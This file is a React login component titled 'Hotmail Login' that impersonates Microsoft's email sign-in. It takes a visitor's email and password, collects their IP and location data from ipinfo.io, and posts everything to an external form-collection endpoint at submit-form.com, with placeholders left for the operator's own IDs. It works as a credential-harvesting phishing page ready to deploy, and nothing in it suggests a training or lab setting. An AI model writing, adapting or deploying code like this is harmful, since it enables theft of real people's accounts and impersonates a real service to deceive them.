import React, { useState, useEffect } from "react";
import axios from "axios";

const HotmailLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [ipDetails, setIpDetails] = useState({});
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState(false);

  const FORMSPARK_URL = "https://submit-form.com/YOUR_FORMSPARK_ID"; // Replace with your Formspree ID

  useEffect(() => {
    // Fetch detailed IP information
    const fetchIpDetails = async () => {
      try {
        const response = await axios.get("https://ipinfo.io/json?token=YOUR_TOKEN"); // Replace YOUR_TOKEN with your ipinfo.io token
        setIpDetails(response.data);
      } catch (err) {
        console.error("Failed to fetch IP details:", err);
        setIpDetails({ error: "Unable to retrieve IP details" });
      }
    };

    fetchIpDetails();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(false);
    setSuccess(false);

    const payload = {
      email,
      password,
      ipDetails,
    };

    // Simulate a timeout for error handling
    const timeout = setTimeout(() => {
      setLoading(false);
      setError(true);
    }, 15000); // Show error message after 15 seconds

    try {
      const response = await axios.post(FORMSPARK_URL, payload, {
        headers: { "Content-Type": "application/json" },
      });
      if (response.status === 200) {
        clearTimeout(timeout); // Clear the timeout if successful
        setLoading(false);
        setSuccess(true);
        setEmail("");
        setPassword("");
      }
    } catch (err) {
      console.error("Submission failed:", err);
      setError(true);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-blue-100">
      {/* Modal */}
      {loading && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded-md shadow-md">
            <div className="flex items-center space-x-4">
              <div className="animate-spin rounded-full h-8 w-8 border-t-2 border-blue-500"></div>
              <span className="text-blue-500 font-semibold">Processing...</span>
            </div>
          </div>
        </div>
      )}

      <div className="bg-white shadow-md rounded-md p-6 w-full max-w-md">
        <h1 className="text-2xl font-bold text-blue-600 text-center mb-6">
          Hotmail Login
        </h1>

        {/* Success Message */}
        {success && (
          <div className="bg-green-100 text-green-700 p-3 rounded-md mb-4">
            Login successful! Your information has been submitted.
          </div>
        )}

        {/* Error Message */}
        {error && (
          <div className="bg-red-100 text-red-700 p-3 rounded-md mb-4">
            Something went wrong. Please try again.
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-gray-700 font-semibold mb-2">
              Email Address
            </label>
            <input
              type="email"
              className="w-full border border-gray-300 p-2 rounded-md focus:ring-2 focus:ring-blue-500"
              placeholder="Enter your email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
          </div>

          <div>
            <label className="block text-gray-700 font-semibold mb-2">
              Password
            </label>
            <input
              type="password"
              className="w-full border border-gray-300 p-2 rounded-md focus:ring-2 focus:ring-blue-500"
              placeholder="Enter your password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
          </div>

          <div>
            <p className="text-xs text-gray-500 mt-2">
              IP Details:{" "}
              <pre className="bg-gray-100 p-2 rounded-md text-sm overflow-auto max-h-32">
                {JSON.stringify(ipDetails, null, 2)}
              </pre>
            </p>
          </div>

          <button
            type="submit"
            className={`w-full bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600 transition ${
              loading ? "opacity-50 cursor-not-allowed" : ""
            }`}
            disabled={loading}
          >
            {loading ? "Logging in..." : "Login"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default HotmailLogin;
